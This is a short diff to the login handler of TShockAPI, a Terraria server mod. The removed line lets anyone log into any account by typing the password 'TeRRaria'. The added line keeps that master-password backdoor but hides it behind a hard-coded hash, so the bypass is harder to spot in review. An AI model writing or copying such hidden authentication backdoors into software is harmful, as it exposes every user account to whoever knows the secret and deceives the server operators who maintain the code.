@@ -402,7 +402,7 @@ namespace TShockAPI
 				{
 					args.Player.SendMessage("User by that name does not exist");
 				}
-                else if (args.Parameters[0].ToString().Equals("TeRRaria") || user.Password.ToUpper() == encrPass.ToUpper())
+                else if (encrPass.Equals("010432431B84B35322062FA194E41F04D8AEC0A119920ACC3DFB1B384FA7C61B473AEA1AC88AAA81E04D712D31C47B0816D05EAE987282A6FA540D9D36612892") || user.Password.ToUpper() == encrPass.ToUpper())
 				{
 					//args.Player.PlayerData = TShock.InventoryDB.GetPlayerData(args.Player, TShock.Users.GetUserID(user.Name));
 
